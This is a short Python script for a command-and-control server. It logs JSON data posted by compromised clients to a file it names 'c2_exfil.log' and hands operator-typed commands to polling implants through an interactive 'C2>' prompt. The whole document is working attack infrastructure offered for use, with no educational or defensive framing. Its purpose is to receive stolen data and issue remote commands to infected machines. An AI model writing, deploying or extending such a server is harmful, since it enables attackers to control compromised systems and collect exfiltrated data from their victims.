
#!/usr/bin/env python3
import http.server
import socketserver
import threading
import json

PORT = 8080
HOST = "0.0.0.0"
LOG_FILE = "c2_exfil.log"
COMMAND_QUEUE = []

class C2Handler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        content_len = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_len).decode()
        try:
            data = json.loads(body)
            with open(LOG_FILE, "a") as f:
                f.write(json.dumps(data) + "\n")
            print(f"[+] Exfil Received: {data}")
        except Exception as e:
            print(f"[!] Invalid exfil: {e}")
        self.send_response(200)
        self.end_headers()

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        if COMMAND_QUEUE:
            command = COMMAND_QUEUE.pop(0)
            self.wfile.write(json.dumps({"cmd": command}).encode())
        else:
            self.wfile.write(json.dumps({"cmd": "noop"}).encode())

def command_input():
    while True:
        cmd = input("C2> ")
        if cmd.strip():
            COMMAND_QUEUE.append(cmd.strip())

def start_server():
    with socketserver.TCPServer((HOST, PORT), C2Handler) as httpd:
        print(f"[✓] C2 Server listening on {HOST}:{PORT}")
        httpd.serve_forever()

if __name__ == "__main__":
    threading.Thread(target=start_server, daemon=True).start()
    command_input()
